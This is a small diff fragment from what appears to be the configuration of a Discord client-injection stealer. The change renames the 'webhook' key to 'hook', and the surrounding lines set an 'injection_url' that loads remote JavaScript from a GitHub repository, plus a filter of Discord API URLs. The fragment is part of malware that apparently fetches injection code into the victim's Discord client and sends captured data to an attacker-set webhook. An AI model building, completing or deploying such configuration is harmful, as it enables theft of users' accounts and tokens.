@@ -27,7 +27,7 @@ const config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js",
-    webhook: "%WEBHOOK%",
+    hook: "%WEBHOOK%",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
